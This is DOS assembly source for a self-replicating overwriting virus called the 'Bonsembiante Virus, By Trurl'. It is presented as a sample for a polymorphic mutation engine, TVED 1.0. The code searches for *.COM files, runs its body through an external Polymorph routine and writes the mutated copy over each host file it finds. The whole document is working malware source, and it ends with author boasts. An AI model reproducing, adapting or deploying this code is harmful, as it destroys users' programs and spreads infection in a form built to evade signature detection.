

VirLen		equ		offset VirEnd-offset Start
code 	segment byte public
	assume cs:code, ds:code, es:code, ss:code
	org 100h

; Note that this is a totally unremarkable virus, made only to be an example
; for the use of the TVED 1.0
; Named Bonsembiante Virus so you, Fernando, now have a virus named after
; you (gna gna gna!)

extrn Polymorph: proc
Start:
	call Next
Next:
	pop si
	sub si, 3

	MOV	AH,4Eh			; Find first file
	MOV	CL,20h
	MOV	DX,offset loc_1-offset Start; *.COM
	add 	dx, si
	INT	21h
loc_2:
	MOV	DX,9Eh		; Open File for writing
	MOV	AX,3D01h
	INT	21h

	push si
	mov dx, si
	mov cx, VirLen+684
	mov di, VirLen+684
	add di, si
	mov si, 100h
	call Polymorph
	add cx, VirLen+684
	pop si

	MOV	BX,AX			; Write virus
	MOV	DX,VirLen+684
	add dx, si
	MOV	AH,40h
	INT	21h

	MOV	AH,3Eh			; close file
	INT	21h

	MOV	AH,4Fh
	INT	21h
	JNB	loc_2
	INT	20h
; Data
loc_1		db		"*.COM", 0
Text		db		"Bonsembiante Virus, By Trurl"
VirEnd label byte
ends
end Start
; TâUâL RuLeZ! YEAH!
; Trurl Trurl Trurl Trurl Trurl Trurl Trurl Trurl Trurl Trurl Trurl Trurl Trurl
